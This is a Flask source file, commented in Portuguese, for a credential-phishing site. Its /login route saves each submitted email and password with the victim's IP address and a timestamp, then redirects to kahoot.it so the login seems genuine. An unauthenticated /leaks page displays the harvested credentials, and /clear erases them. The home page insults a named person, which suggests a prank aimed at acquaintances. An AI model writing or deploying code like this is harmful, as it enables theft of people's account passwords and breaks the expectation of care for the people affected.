from flask import Flask, render_template, request, redirect # importa a classe do Flask da biblioteca flask
from forms import Login
from config import AppConfig
from flask_limiter import Limiter
from werkzeug.middleware.proxy_fix import ProxyFix
from .utils import relative_timedelta
from datetime import datetime
from . import leaklog
app = Flask(__name__)
app.config.from_object(AppConfig)

limiter = Limiter(
    key_func=AppConfig.LIMITER_KEY_FUNC,
    storage_uri=AppConfig.LIMITER_STORAGE_URI,
    app=app,
    default_limits=["50 per minute", "10 per second"] # Limita a conexão para evitar ataques DoS
    )


def get_client_ip():
    # Primeiro, verifique se o cabeçalho X-Forwarded-For está presente
    if 'X-Forwarded-For' in request.headers:
        # O cabeçalho X-Forwarded-For pode conter uma lista de endereços IP separados por vírgula
        # O endereço IP do cliente é geralmente o primeiro na lista
        return request.headers.get('X-Forwarded-For').split(',')[0]
    # Se o cabeçalho X-Forwarded-For não estiver presente, retorne o endereço IP remoto padrão
    return request.remote_addr

@app.route('/leaks')
def log():
    return render_template('log.html', log=leaklog.log)

@app.route('/')
def home():
    return render_template('index.html', variavel="Henricco bobão")

@app.route('/login', methods=["POST", "GET"])
def sobre():
    form = Login()
    
    if request.method == "POST":
        if form.validate_on_submit():
            
            leaklog.log.append(
                {
                    "email":form.email.data,
                    "password":form.password.data,
                    "ip_address":str(get_client_ip()),
                    "timestamp": datetime.now()
                }
            )
            return redirect("https://kahoot.it")

    return render_template('login.html', form = form)

@app.route('/clear')
def clear_leak():
    leaklog.log.clear()
    return redirect('/leaks')

app.jinja_env.globals.update(format_relative_time=relative_timedelta.format_relative_time)

def create_app():
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_host=1) # Resolve o Proxy para obter o endereço IP real do cliente 
    return app
    